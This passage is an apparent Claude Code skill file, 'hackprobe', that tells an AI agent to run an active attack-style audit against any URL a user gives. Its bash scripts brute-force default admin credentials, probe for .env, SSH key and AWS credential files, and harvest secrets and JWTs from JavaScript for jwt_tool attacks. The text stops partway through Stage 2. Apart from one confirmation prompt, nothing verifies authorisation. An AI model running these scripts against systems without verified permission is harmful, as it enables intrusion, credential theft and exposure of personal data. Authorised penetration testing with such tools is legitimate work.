---
name: hackprobe
description: "AI-assisted black-box security audit. Combines 25+ CLI tools with LLM reasoning to find business logic vulnerabilities, secret leaks, OSINT exposure, unauthenticated APIs, archive PII leaks, payment/CRM injection, and framework-specific attack surfaces. Orchestrates parallel tool groups, persists results to markdown, then uses AI to chain findings into exploit paths with CVSS scoring and business impact assessment. Use when user provides a URL to hack, audit, or find vulnerabilities."
---

# hackprobe — AI-Assisted Black-Box Security Audit

## CONFIRMATION (MANDATORY)

Before ANY action, ask: **"You are about to run an active security audit against `<URL>`. Are you aware of your actions and sure you want to proceed?"**

Only proceed after explicit confirmation.

---

## Architecture

hackprobe runs in 6 sequential stages. Each stage spawns **parallel sub-agents** via the Agent tool (one agent per group, all in a single message). **Stages are strictly sequential** — always wait for all agents in the current stage to complete before starting the next stage. Each agent persists results to `results/<group>.md`. Stage 6 is the AI orchestrator — it reads all results and reasons about business logic, chains findings, and scores by business impact.

**Execution model:**
- **Between stages:** Strictly sequential. Wait for ALL agents in Stage N to finish before spawning Stage N+1.
- **Within stages:** Parallel. Spawn one agent per group in a single message.
- **Agent prompts:** Each agent receives the preamble (WORK_DIR, HOST, URL) and the group's bash script.
- **Result persistence:** Every agent MUST write its results to `results/<group>.md` before returning. After each stage completes, verify result files exist by reading them. Agent summaries alone are NOT sufficient — the files on disk are the source of truth for subsequent stages.

```
Stage 1: OSINT & Recon ──────────── (6 parallel agents → wait for all)
    ↓
Stage 2: Automated Scanning ─────── (4 parallel agents → wait for all)
    ↓
Stage 3: Browser Analysis ──────── (1 agent, Playwright MCP → wait)
    ↓
Stage 4: Active Injection Testing ── (6 parallel agents 4A–4D,4F,4G → wait → 1 agent 4E → wait)
    ↓
Stage 5: Deep Analysis ──────────── (5 parallel agents → wait for all)
    ↓
Stage 6: AI Orchestrator ─────────── (main context — reads all results/*.md, chains findings, report)
```

---

## Setup

All commands in this skill are **bash**. Claude Code should execute them via the Bash tool.

**IMPORTANT — Shell state:** Claude Code's Bash tool does NOT persist environment between calls. Every Bash call starts a fresh shell. Every code block below must begin with the preamble:

```bash
# === PREAMBLE (copy into EVERY Bash call) ===
export PATH="/opt/homebrew/bin:/usr/local/bin:$HOME/go/bin:$HOME/.local/bin:$PATH"
WORK_DIR="<SET_ONCE_AND_REUSE>"  # e.g. /tmp/hackprobe_1710400000
cd "$WORK_DIR"
# === END PREAMBLE ===
```

**First call only — create workspace:**

```bash
export PATH="/opt/homebrew/bin:/usr/local/bin:$HOME/go/bin:$HOME/.local/bin:$PATH"
WORK_DIR="/tmp/hackprobe_$(date +%s)"
mkdir -p "$WORK_DIR/results"
cd "$WORK_DIR"
echo "$WORK_DIR"  # Save this — reuse in every subsequent call
```

**Install all tools:** Run `bash /path/to/hackprobe/install.sh`

---

## Tool Arsenal

| Tool | Purpose |
|------|---------|
| `nmap` | Port scan + service/version detection + NSE scripts + `http-default-accounts` for default login detection |
| `naabu` | Fast async port scan (Go) — used for initial sweep before nmap deep scan |
| `sqlmap` | SQL injection exploitation |
| `dalfox` | XSS scanner with real browser confirmation |
| `ffuf` | Directory and parameter fuzzing |
| `feroxbuster` | Recursive content discovery (Rust, faster and more thorough than gobuster) |
| `testssl` | SSL/TLS full analysis (more comprehensive than sslyze, single binary, no pip) |
| `wafw00f` | WAF fingerprinting |
| `subfinder` | Subdomain enumeration (more sources and faster than assetfinder) |
| `amass` | OSINT subdomain/ASN enumeration |
| `dnsx` | DNS resolution and brute-force |
| `httpx` | HTTP probing + tech stack detection |
| `katana` | Web crawler with headless browser support (supersedes hakrawler/gospider — same org, actively maintained) |
| `gau` | Historical URL collection from Wayback Machine, CommonCrawl, OTX |
| `waybackurls` | Wayback Machine URL dump |
| `trufflehog` | Secret scanning with 800+ detectors and live API verification (supersedes gitleaks/cariddi/mantra — verifies secrets are actually valid, not just regex matches) |
| `gf` | Grep filter patterns for injection candidates (sqli, xss, ssrf, idor) |
| `qsreplace` | URL parameter replacement for payload injection |
| `anew` | Append unique lines to files |
| `uro` | URL deduplication |
| `s3scanner` | S3/GCS/Azure bucket public access testing |
| `interactsh-client` | Out-of-band callback server for blind SSRF/XSS confirmation |
| `subzy` | Subdomain takeover detection — checks CNAME dangling against known-vulnerable services (Go, MIT, actively maintained) |
| `crlfuzz` | CRLF injection scanner — fast, Go-native, pipes from URL lists (ProjectDiscovery ecosystem) |
| `jwt_tool` | JWT attack suite — algorithm confusion (RS256→HS256), none alg, weak secrets, kid injection |
| `arjun` | Hidden HTTP parameter discovery — brute-forces GET/POST/JSON params (e.g., `admin=true`, `debug=1`) |
| `theHarvester` | Passive OSINT — emails, subdomains, employee names from 40+ public sources (Google, Bing, Shodan, VirusTotal, DNSdumpster) |
| `whois` | Domain registrar, creation/expiry dates, registrant info (pre-installed on macOS/Linux) |
| `dig` / `host` / `nslookup` | DNS record queries — MX, TXT (SPF/DMARC/DKIM), NS, CNAME, AXFR zone transfer (pre-installed on macOS/Linux) |
| `curl crt.sh` | Certificate transparency log search — discovers subdomains via issued SSL certificates (no install, uses curl) |
| **Playwright MCP** | Browser automation — navigate JS-rendered pages, fill forms, extract localStorage/cookies, test DOM XSS, exploit client-side auth flows |

---

## STAGE 1 — OSINT & Recon (spawn 6 parallel agents, then wait)

> **Instruction to Claude:** Spawn 6 parallel agents via the Agent tool in a single message (one per group). Each agent receives the preamble (WORK_DIR, HOST, URL) and its group's bash script as the prompt. The agent executes the commands via Bash and returns a summary. **Wait for ALL 6 agents to complete before starting Stage 2.** After completion, verify `results/01_*.md` files exist.

### Group 1A: Business Intelligence & OSINT

Use web search and web fetch tools to gather business context. This group combines CLI tools AND Claude's built-in WebSearch/WebFetch tools.

**Part 1 — WebSearch (Claude tool, not CLI).** Search and write findings to `results/01_osint.md`:

- What does this company do? Product, industry, audience size
- `"<COMPANY>" site:crunchbase.com` — revenue, funding, employee count
- `site:linkedin.com "<COMPANY>" "tech stack" OR "we use" OR "hiring"` — tech stack from job postings
- `"<HOST>" site:stackshare.io` — public tech stack profiles
- `"<HOST>" breach OR hack OR vulnerability OR CVE` — previous security incidents
- App store reviews (if mobile app exists) — look for security complaints
- Key people (CTO, VP Eng) from LinkedIn — for responsible disclosure later
- Regulatory context: does the product handle health data (GDPR Art.9)? Financial data (PCI-DSS)? Children (COPPA)?

**Part 2 — theHarvester (passive OSINT).** Gather emails, subdomains, employee names:

```bash
HOST="<HOST>"

echo "## Passive OSINT — theHarvester" > results/01_osint_harvester.md

# Harvest emails, subdomains, employee names from public sources
theHarvester -d "$HOST" -b google,bing,dnsdumpster,virustotal,crtsh -l 200 -f /tmp/harvester_out 2>/dev/null

echo "### Emails Found" >> results/01_osint_harvester.md
echo '```' >> results/01_osint_harvester.md
cat /tmp/harvester_out.json 2>/dev/null | python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  for e in d.get('emails',[]): print(e)
except: pass
" 2>/dev/null >> results/01_osint_harvester.md
echo '```' >> results/01_osint_harvester.md

echo "" >> results/01_osint_harvester.md
echo "### Hosts Found" >> results/01_osint_harvester.md
echo '```' >> results/01_osint_harvester.md
cat /tmp/harvester_out.json 2>/dev/null | python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  for h in d.get('hosts',[]): print(h)
except: pass
" 2>/dev/null >> results/01_osint_harvester.md
echo '```' >> results/01_osint_harvester.md
```

### Group 1B: Subdomain & DNS Enumeration + Takeover Check

```bash
HOST="<HOST>"

echo "## Subdomain & DNS Enumeration" > results/01_subdomains.md
echo "**Target:** $HOST" >> results/01_subdomains.md
echo "**Date:** $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> results/01_subdomains.md
echo "" >> results/01_subdomains.md

# Subdomain enumeration
subfinder -d "$HOST" -silent 2>/dev/null | anew subdomains.txt
amass enum -passive -d "$HOST" -timeout 3 2>/dev/null | anew subdomains.txt

# Certificate transparency — discovers subdomains via SSL cert logs
curl -s "https://crt.sh/?q=%25.$HOST&output=json" 2>/dev/null | python3 -c "
import sys,json
try:
  for c in json.load(sys.stdin):
    for name in c.get('name_value','').split('\n'):
      if name.strip(): print(name.strip())
except: pass
" 2>/dev/null | sort -u | anew subdomains.txt

# Resolve and probe
cat subdomains.txt | dnsx -silent 2>/dev/null | anew resolved.txt

# Clean URLs (one per line, no extras) — used by API sweeps
cat subdomains.txt | httpx -silent -status-code -title -tech-detect -o live_subdomains.txt 2>/dev/null
awk '{print $1}' live_subdomains.txt > live_subdomains_clean.txt

echo "### Live Subdomains ($(wc -l < live_subdomains_clean.txt 2>/dev/null | tr -d ' '))" >> results/01_subdomains.md
echo '```' >> results/01_subdomains.md
cat live_subdomains.txt >> results/01_subdomains.md
echo '```' >> results/01_subdomains.md

# DNS zone transfer — can leak entire zone in 1 query
echo "" >> results/01_subdomains.md
echo "### DNS Zone Transfer (AXFR)" >> results/01_subdomains.md
NS_SERVER=$(dig NS "$HOST" +short 2>/dev/null | head -1)
if [ -n "$NS_SERVER" ]; then
  AXFR_RESULT=$(dig axfr "$HOST" @"$NS_SERVER" 2>&1)
  if echo "$AXFR_RESULT" | grep -q "XFR size"; then
    echo "**CRITICAL: Zone transfer allowed!** Full zone dumped:" >> results/01_subdomains.md
    echo '```' >> results/01_subdomains.md
    echo "$AXFR_RESULT" >> results/01_subdomains.md
    echo '```' >> results/01_subdomains.md
    # Add any new subdomains from zone transfer
    echo "$AXFR_RESULT" | awk '/IN\s+(A|AAAA|CNAME)/{print $1}' | sed 's/\.$//' | sort -u | anew subdomains.txt
  else
    echo "Zone transfer denied (expected)." >> results/01_subdomains.md
  fi
fi

# Subdomain takeover check
echo "" >> results/01_subdomains.md
echo "### Subdomain Takeover Check" >> results/01_subdomains.md
echo '```' >> results/01_subdomains.md
subzy run --targets subdomains.txt --hide_fails 2>/dev/null >> results/01_subdomains.md
echo '```' >> results/01_subdomains.md
```

### Group 1C: URL Collection (Historical + Live)

```bash
HOST="<HOST>"
URL="<URL>"

echo "## URL Collection" > results/01_urls.md

# Historical URLs
echo "$HOST" | gau --blacklist png,jpg,gif,svg,css,woff,ico,mp4 2>/dev/null | anew all_urls.txt
waybackurls "$HOST" 2>/dev/null | anew all_urls.txt

# Live crawl
katana -u "$URL" -d 5 -jc -silent 2>/dev/null | anew all_urls.txt

# Deduplicate — uro removes param-duplicate URLs (smarter than sort -u)
# e.g., /page?id=1 and /page?id=2 collapse to /page?id=FUZZ
cat all_urls.txt | uro 2>/dev/null | sort -u > all_urls_deduped.txt
mv all_urls_deduped.txt all_urls.txt

echo "**Total URLs:** $(wc -l < all_urls.txt | tr -d ' ')" >> results/01_urls.md

# ffuf — hidden directory/parameter discovery
WORDLIST="/opt/homebrew/share/wordlists/dirb/common.txt"
[ ! -f "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/dirb/common.txt"
[ ! -f "$WORDLIST" ] && curl -sk "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt" -o /tmp/common.txt 2>/dev/null && WORDLIST="/tmp/common.txt"

if [ -f "$WORDLIST" ]; then
  echo "" >> results/01_urls.md
  echo "### ffuf Directory Discovery" >> results/01_urls.md
  ffuf -u "${URL}/FUZZ" -w "$WORDLIST" -mc 200,301,302,403 \
    -t 50 -ac -o ffuf_dirs.json -of json 2>/dev/null
  echo "**Directories found:** $(cat ffuf_dirs.json 2>/dev/null | python3 -c "import sys,json;print(len(json.load(sys.stdin).get('results',[])))" 2>/dev/null || echo 0)" >> results/01_urls.md
fi

# Hidden parameter discovery — finds params like admin=true, debug=1, role=admin
echo "" >> results/01_urls.md
echo "### Hidden Parameter Discovery (Arjun)" >> results/01_urls.md
arjun -u "$URL" -oJ arjun_params.json -t 10 --stable 2>/dev/null
if [ -s arjun_params.json ]; then
  echo '```json' >> results/01_urls.md
  cat arjun_params.json >> results/01_urls.md
  echo '```' >> results/01_urls.md
fi

# Pre-classify URLs for injection testing
cat all_urls.txt | gf sqli 2>/dev/null | anew sqli_params.txt
cat all_urls.txt | gf xss 2>/dev/null | anew xss_params.txt
cat all_urls.txt | gf ssrf 2>/dev/null | anew ssrf_params.txt
cat all_urls.txt | gf lfi 2>/dev/null | anew lfi_params.txt
cat all_urls.txt | gf redirect 2>/dev/null | anew redirect_params.txt
cat all_urls.txt | gf idor 2>/dev/null | anew idor_params.txt

echo "### Injection Candidates" >> results/01_urls.md
echo "| Category | Count |" >> results/01_urls.md
echo "|----------|-------|" >> results/01_urls.md
echo "| SQLi | $(wc -l < sqli_params.txt 2>/dev/null | tr -d ' ') |" >> results/01_urls.md
echo "| XSS | $(wc -l < xss_params.txt 2>/dev/null | tr -d ' ') |" >> results/01_urls.md
echo "| SSRF | $(wc -l < ssrf_params.txt 2>/dev/null | tr -d ' ') |" >> results/01_urls.md
echo "| LFI | $(wc -l < lfi_params.txt 2>/dev/null | tr -d ' ') |" >> results/01_urls.md
echo "| Redirect | $(wc -l < redirect_params.txt 2>/dev/null | tr -d ' ') |" >> results/01_urls.md
echo "| IDOR | $(wc -l < idor_params.txt 2>/dev/null | tr -d ' ') |" >> results/01_urls.md
```

### Group 1D: Port Scan + WAF Detection

```bash
HOST="<HOST>"
URL="<URL>"

echo "## Infrastructure Scan" > results/01_infra.md

# Full port scan — all 65535 ports
# naabu is fast enough (Go, async) to scan all ports in ~2 min
naabu -host "$HOST" -p - -silent 2>/dev/null | tee open_ports.txt
echo "### Open Ports (full 65535 scan)" >> results/01_infra.md
echo '```' >> results/01_infra.md
cat open_ports.txt >> results/01_infra.md
echo '```' >> results/01_infra.md

# Service detection on open ports
PORTS=$(cat open_ports.txt | cut -d: -f2 | paste -sd, -)
[ -n "$PORTS" ] && nmap -sV -sC -T4 -p "$PORTS" "$HOST" -oN nmap_services.txt 2>&1
echo "### Service Detection" >> results/01_infra.md
echo '```' >> results/01_infra.md
cat nmap_services.txt 2>/dev/null >> results/01_infra.md
echo '```' >> results/01_infra.md

# WAF detection
echo "### WAF Detection" >> results/01_infra.md
wafw00f "$URL" 2>&1 | tee -a results/01_infra.md
```

### Group 1E: Tech Stack Fingerprinting

Identify the full technology stack from multiple signals. Write to `results/01_techstack.md`.

```bash
URL="<URL>"
HOST="<HOST>"

echo "## Tech Stack Fingerprint" > results/01_techstack.md

# HTTP headers
HEADERS=$(curl -sk -I -L --max-redirs 3 "$URL" -A "Mozilla/5.0" 2>&1)
echo "### From HTTP Headers" >> results/01_techstack.md
echo '```' >> results/01_techstack.md
echo "$HEADERS" | grep -iE "x-powered-by|server:|x-nextjs|x-drupal|x-generator|x-aspnet|x-framework|via:" >> results/01_techstack.md
echo '```' >> results/01_techstack.md

# httpx tech detection
echo "" >> results/01_techstack.md
echo "### From httpx Tech Detection" >> results/01_techstack.md
echo '```' >> results/01_techstack.md
echo "$URL" | httpx -silent -tech-detect -status-code -title -content-length -follow-redirects 2>/dev/null >> results/01_techstack.md
echo '```' >> results/01_techstack.md

# HTML source analysis
PAGE=$(curl -sk "$URL")
echo "" >> results/01_techstack.md
echo "### From Page Source" >> results/01_techstack.md
echo "| Signal | Detected |" >> results/01_techstack.md
echo "|--------|----------|" >> results/01_techstack.md

echo "$PAGE" | grep -q "__NEXT_DATA__" && echo "| Frontend Framework | Next.js |" >> results/01_techstack.md
echo "$PAGE" | grep -q "__NUXT__" && echo "| Frontend Framework | Nuxt.js |" >> results/01_techstack.md
echo "$PAGE" | grep -q "__sveltekit" && echo "| Frontend Framework | SvelteKit |" >> results/01_techstack.md
echo "$PAGE" | grep -q "__remixContext" && echo "| Frontend Framework | Remix |" >> results/01_techstack.md
echo "$PAGE" | grep -q "ng-version" && echo "| Frontend Framework | Angular |" >> results/01_techstack.md
echo "$PAGE" | grep -qi "wp-content\|wordpress" && echo "| CMS | WordPress |" >> results/01_techstack.md
echo "$PAGE" | grep -qi "shopify" && echo "| Platform | Shopify |" >> results/01_techstack.md
echo "$PAGE" | grep -qi "webflow" && echo "| Platform | Webflow |" >> results/01_techstack.md

# Extract third-party services from script tags and network references
echo "" >> results/01_techstack.md
echo "### Third-Party Services (from script/link tags)" >> results/01_techstack.md
echo '```' >> results/01_techstack.md
echo "$PAGE" | grep -oiE 'src="https?://[^"]+' | grep -oE 'https?://[^/"]+' | sort -u | head -20 >> results/01_techstack.md
echo '```' >> results/01_techstack.md

# Detect analytics, payment, CRM, auth providers
echo "" >> results/01_techstack.md
echo "### Identified Services" >> results/01_techstack.md
echo "$PAGE" | grep -qi "google-analytics\|gtag\|googletagmanager" && echo "- Google Analytics / GTM" >> results/01_techstack.md
echo "$PAGE" | grep -qi "amplitude" && echo "- Amplitude" >> results/01_techstack.md
echo "$PAGE" | grep -qi "segment\|analytics.js" && echo "- Segment" >> results/01_techstack.md
echo "$PAGE" | grep -qi "stripe" && echo "- Stripe (payments)" >> results/01_techstack.md
echo "$PAGE" | grep -qi "solidgate" && echo "- Solidgate (payments)" >> results/01_techstack.md
echo "$PAGE" | grep -qi "paypal" && echo "- PayPal (payments)" >> results/01_techstack.md
echo "$PAGE" | grep -qi "customer\.io\|customerio" && echo "- Customer.io (CRM)" >> results/01_techstack.md
echo "$PAGE" | grep -qi "intercom" && echo "- Intercom" >> results/01_techstack.md
echo "$PAGE" | grep -qi "hubspot" && echo "- HubSpot" >> results/01_techstack.md
echo "$PAGE" | grep -qi "sentry" && echo "- Sentry (error tracking)" >> results/01_techstack.md
echo "$PAGE" | grep -qi "auth0" && echo "- Auth0 (authentication)" >> results/01_techstack.md
echo "$PAGE" | grep -qi "firebase" && echo "- Firebase" >> results/01_techstack.md
echo "$PAGE" | grep -qi "supabase" && echo "- Supabase" >> results/01_techstack.md
echo "$PAGE" | grep -qi "cloudflare" && echo "- Cloudflare" >> results/01_techstack.md
echo "$PAGE" | grep -qi "facebook.*pixel\|fbevents\|fbq(" && echo "- Facebook Pixel" >> results/01_techstack.md
echo "$PAGE" | grep -qi "clarity\.ms" && echo "- Microsoft Clarity" >> results/01_techstack.md
echo "$PAGE" | grep -qi "hotjar" && echo "- Hotjar" >> results/01_techstack.md
echo "$PAGE" | grep -qi "growthbook\|launchdarkly\|split\.io" && echo "- Feature flags (GrowthBook/LaunchDarkly/Split)" >> results/01_techstack.md
```

Also use **WebSearch** (Claude tool, not CLI) to search for:
- `site:linkedin.com "<COMPANY>" "tech stack" OR "we use" OR "hiring"` — extract stack from job postings
- `"<HOST>" site:stackshare.io` — public tech stack profiles
- `"<HOST>" breach OR vulnerability OR CVE` — past incidents

Write findings to `results/01_techstack.md`.

### Group 1F: Domain Intelligence & Email Security

```bash
HOST="<HOST>"

echo "## Domain Intelligence & Email Security" > results/01_domain.md

# === WHOIS / RDAP ===
echo "### Domain Registration" >> results/01_domain.md

# RDAP (modern, structured JSON replacement for whois)
RDAP_RESP=$(curl -sk "https://rdap.org/domain/$HOST" --max-time 10 2>/dev/null)
if [ -n "$RDAP_RESP" ]; then
  echo "#### RDAP Lookup" >> results/01_domain.md
  echo '```json' >> results/01_domain.md
  echo "$RDAP_RESP" | python3 -c "
import sys, json
try:
  d = json.load(sys.stdin)
  print(json.dumps({
    'name': d.get('ldhName'),
    'status': d.get('status'),
    'registrar': next((e.get('vcardArray','')[1][1][3] for e in d.get('entities',[]) if 'registrar' in e.get('roles',[])), 'unknown'),
    'events': [{e['eventAction']: e['eventDate']} for e in d.get('events',[])],
    'nameservers': [ns.get('ldhName') for ns in d.get('nameservers',[])]
  }, indent=2))
except: print('RDAP parse failed')
" 2>/dev/null >> results/01_domain.md
  echo '```' >> results/01_domain.md
fi

# Classic WHOIS fallback
echo "" >> results/01_domain.md
echo "#### WHOIS" >> results/01_domain.md
echo '```' >> results/01_domain.md
whois "$HOST" 2>/dev/null | grep -iE "registrar|creation|expir|updated|name server|registrant|org|country|dnssec" | head -20 >> results/01_domain.md
echo '```' >> results/01_domain.md

# === DNS Records ===
echo "" >> results/01_domain.md
echo "### DNS Records" >> results/01_domain.md

echo "#### Nameservers" >> results/01_domain.md
echo '```' >> results/01_domain.md
dig "$HOST" NS +short 2>/dev/null >> results/01_domain.md
echo '```' >> results/01_domain.md

echo "" >> results/01_domain.md
echo "#### MX Records (email provider)" >> results/01_domain.md
echo '```' >> results/01_domain.md
dig "$HOST" MX +short 2>/dev/null >> results/01_domain.md
echo '```' >> results/01_domain.md

echo "" >> results/01_domain.md
echo "#### A / AAAA Records" >> results/01_domain.md
echo '```' >> results/01_domain.md
dig "$HOST" A +short 2>/dev/null >> results/01_domain.md
dig "$HOST" AAAA +short 2>/dev/null >> results/01_domain.md
echo '```' >> results/01_domain.md

# === Email Security (SPF / DMARC / DKIM) ===
echo "" >> results/01_domain.md
echo "### Email Security" >> results/01_domain.md
echo "| Check | Status | Value |" >> results/01_domain.md
echo "|-------|--------|-------|" >> results/01_domain.md

# SPF
SPF=$(dig "$HOST" TXT +short 2>/dev/null | grep -i "v=spf1")
if [ -n "$SPF" ]; then
  echo "| SPF | ✓ Present | \`$SPF\` |" >> results/01_domain.md
else
  echo "| SPF | **✗ MISSING** | No SPF record — anyone can spoof emails from this domain |" >> results/01_domain.md
fi

# DMARC
DMARC=$(dig "_dmarc.$HOST" TXT +short 2>/dev/null | grep -i "v=DMARC")
if [ -n "$DMARC" ]; then
  echo "| DMARC | ✓ Present | \`$DMARC\` |" >> results/01_domain.md
  echo "$DMARC" | grep -qi "p=none" && echo "| DMARC Policy | ⚠ Weak | Policy is \`none\` — spoofed emails are not rejected |" >> results/01_domain.md
else
  echo "| DMARC | **✗ MISSING** | No DMARC record — no email authentication policy |" >> results/01_domain.md
fi

# DKIM (check common selectors)
DKIM_FOUND=false
for selector in default google selector1 selector2 k1 mail dkim s1 s2; do
  DKIM=$(dig "${selector}._domainkey.$HOST" TXT +short 2>/dev/null | grep -i "v=DKIM")
  if [ -n "$DKIM" ]; then
    echo "| DKIM | ✓ Present | selector=\`$selector\` |" >> results/01_domain.md
    DKIM_FOUND=true
    break
  fi
done
[ "$DKIM_FOUND" = false ] && echo "| DKIM | ⚠ Not found | No DKIM on common selectors (default, google, selector1, selector2, k1, mail) |" >> results/01_domain.md

# Email security summary
echo "" >> results/01_domain.md
if [ -z "$SPF" ] || [ -z "$DMARC" ]; then
  echo "**⚠ EMAIL SPOOFING RISK:** Missing SPF and/or DMARC means anyone can send emails appearing to come from \`$HOST\`. This is a phishing/reputation risk." >> results/01_domain.md
fi
```

---

## STAGE 2 — Automated Scanning (spawn 4 parallel agents, then wait)

> **Instruction to Claude:** **Only start after Stage 1 is fully complete.** Spawn 4 parallel agents via the Agent tool (one per group). Each agent receives the preamble and its group's bash script as the prompt. **Wait for ALL 4 agents to complete before starting Stage 3.** Verify `results/02_*.md` files exist.

### Group 2A: Default Login Detection + Service Enumeration

```bash
HOST="<HOST>"
URL="<URL>"

echo "## Default Login Detection & Service Enumeration" > results/02_defaults.md

# Nmap NSE default-accounts — tests known default creds for web apps
# (Tomcat, Cacti, router panels, etc.)
echo "### Default Credential Scan" >> results/02_defaults.md
echo '```' >> results/02_defaults.md
PORTS=$(cat open_ports.txt 2>/dev/null | cut -d: -f2 | paste -sd, - 2>/dev/null)
[ -z "$PORTS" ] && PORTS="80,443,8080,8443,8888,3000,9090"
nmap --script http-default-accounts -p "$PORTS" "$HOST" 2>&1 | tee -a results/02_defaults.md
echo '```' >> results/02_defaults.md

# Also check common admin panels with manual default creds
echo "" >> results/02_defaults.md
echo "### Manual Default Credential Probes" >> results/02_defaults.md
echo "| Status | Panel | Creds Tried |" >> results/02_defaults.md
echo "|--------|-------|-------------|" >> results/02_defaults.md

# Common admin panel default creds
declare -A CREDS=(
  ["/admin"]="admin:admin admin:password"
  ["/wp-login.php"]="admin:admin admin:password"
  ["/manager/html"]="tomcat:tomcat admin:admin tomcat:s3cret"
  ["/phpmyadmin/"]="root: root:root"
  ["/grafana/login"]="admin:admin"
  ["/jenkins/login"]="admin:admin"
)

for path in "${!CREDS[@]}"; do
  for cred in ${CREDS[$path]}; do
    USER=$(echo "$cred" | cut -d: -f1)
    PASS=$(echo "$cred" | cut -d: -f2)
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
      -X POST "${URL}${path}" \
      -d "username=${USER}&password=${PASS}&j_username=${USER}&j_password=${PASS}" \
      -A "Mozilla/5.0" -L)
    [[ "$STATUS" =~ ^(200|302|303)$ ]] && \
      echo "| $STATUS | \`$path\` | \`${USER}:${PASS}\` |" >> results/02_defaults.md
  done
done
```

### Group 2B: Content Discovery + Sensitive Files

```bash
URL="<URL>"

echo "## Content Discovery" > results/02_content.md

# Recursive content discovery
feroxbuster -u "$URL" -d 3 -t 50 -x php,js,json,txt,bak,env,sql,xml,yml,yaml,conf,config,log \
  --quiet --no-state -o ferox_raw.txt 2>&1

echo "### Feroxbuster Results" >> results/02_content.md
echo '```' >> results/02_content.md
cat ferox_raw.txt 2>/dev/null | head -100 >> results/02_content.md
echo '```' >> results/02_content.md

# Sensitive file probe
echo "" >> results/02_content.md
echo "### Sensitive File Probe" >> results/02_content.md
echo "| Status | Size | Path |" >> results/02_content.md
echo "|--------|------|------|" >> results/02_content.md

TARGETS=(
  "/.env" "/.env.local" "/.env.production" "/.env.backup" "/.env.dev"
  "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG" "/.git/logs/HEAD"
  "/.gitignore" "/.github/workflows/"
  "/wp-config.php" "/wp-config.php.bak" "/config.php" "/config.yml" "/config.json"
  "/.aws/credentials" "/.ssh/id_rsa" "/.htpasswd"
  "/backup.sql" "/dump.sql" "/db.sql" "/database.sql" "/backup.zip"
  "/phpinfo.php" "/info.php" "/test.php" "/debug.php" "/server-status" "/server-info"
  "/api/swagger.json" "/swagger.json" "/openapi.json" "/api/docs" "/redoc"
  "/graphql" "/graphiql" "/__graphql"
  "/package.json" "/composer.json" "/composer.lock" "/Dockerfile" "/docker-compose.yml"
  "/.well-known/security.txt" "/robots.txt" "/sitemap.xml"
  "/admin" "/wp-admin" "/administrator" "/_admin" "/cms"
  "/debug" "/test" "/staging" "/dev"
  "/logs/error.log" "/error.log" "/access.log"
)

for path in "${TARGETS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" -L --max-redirs 2 -A "Mozilla/5.0" "${URL}${path}" --max-time 5)
  SIZE=$(curl -sk -w "%{size_download}" -o /dev/null "${URL}${path}" --max-time 5)
  [[ "$STATUS" =~ ^(200|301|302|401|403)$ ]] && echo "| $STATUS | ${SIZE}b | \`$path\` |" >> results/02_content.md
done
```

### Group 2C: Secret Scanning in JS

```bash
HOST="<HOST>"

echo "## Secret Scanning" > results/02_secrets.md

# Collect JS files from Stage 1C URL collection (no redundant gau call)
cat all_urls.txt 2>/dev/null | grep "\.js$" | sort -u > js_files.txt

echo "**JS files found:** $(wc -l < js_files.txt 2>/dev/null | tr -d ' ')" >> results/02_secrets.md

# Download JS files for trufflehog
mkdir -p /tmp/hackprobe_js
while IFS= read -r jsurl; do
  FILE=$(echo "$jsurl" | sed 's/[^a-zA-Z0-9]/_/g').js
  curl -sk "$jsurl" --max-time 10 > "/tmp/hackprobe_js/$FILE" 2>/dev/null
done < js_files.txt

# TruffleHog with live verification
echo "### TruffleHog Results" >> results/02_secrets.md
echo '```' >> results/02_secrets.md
trufflehog filesystem /tmp/hackprobe_js/ --no-update --only-verified 2>/dev/null | head -60 >> results/02_secrets.md
echo '```' >> results/02_secrets.md

# Manual pattern matching for secrets trufflehog might miss
echo "" >> results/02_secrets.md
echo "### Custom Pattern Matches" >> results/02_secrets.md
echo "| Pattern | File |" >> results/02_secrets.md
echo "|---------|------|" >> results/02_secrets.md

for f in /tmp/hackprobe_js/*.js; do
  [ ! -f "$f" ] && continue
  FNAME=$(basename "$f")
  grep -oiE "AKIA[0-9A-Z]{16}" "$f" 2>/dev/null && echo "| AWS Access Key | $FNAME |" >> results/02_secrets.md
  grep -oiE "AIza[0-9A-Za-z\-_]{35}" "$f" 2>/dev/null && echo "| Google API Key | $FNAME |" >> results/02_secrets.md
  grep -oiE "sk_live_[0-9a-zA-Z]{24}" "$f" 2>/dev/null && echo "| Stripe Secret | $FNAME |" >> results/02_secrets.md
  grep -oiE "ghp_[A-Za-z0-9]{36}" "$f" 2>/dev/null && echo "| GitHub PAT | $FNAME |" >> results/02_secrets.md
  grep -oiE "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}" "$f" 2>/dev/null | tee -a jwt_tokens.txt && echo "| JWT Token | $FNAME |" >> results/02_secrets.md
  grep -oiE "(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token)\s*[:=]\s*['\"][^'\"]{8,}" "$f" 2>/dev/null && echo "| Credential Pattern | $FNAME |" >> results/02_secrets.md
  grep -oiE "(mysql|postgres|mongodb|redis|jdbc)://[^\"'<> ]+" "$f" 2>/dev/null && echo "| DB Connection | $FNAME |" >> results/02_secrets.md
done

# JWT attack testing — test any JWTs found in JS files
echo "" >> results/02_secrets.md
echo "### JWT Analysis" >> results/02_secrets.md
if [ -s jwt_tokens.txt ]; then
  sort -u jwt_tokens.txt -o jwt_tokens.txt
  echo "**JWTs found:** $(wc -l < jwt_tokens.txt | tr -d ' ')" >> results/02_secrets.md
  while IFS= read -r token; do
    echo "" >> results/02_secrets.md
    echo "#### Token: \`${token:0:40}...\`" >> results/02_secrets.md
    echo '```' >> results/02_secrets.md
    # Decode header + payload (no verification needed)
    echo "$token" | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null >> results/02_secrets.md
    echo "---" >> results/02_secrets.md
    echo "$token" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null >> results/02_secrets.md
    echo '```' >> results/02_secrets.md
    # jwt_tool — test algorithm confusion, none alg, weak secrets
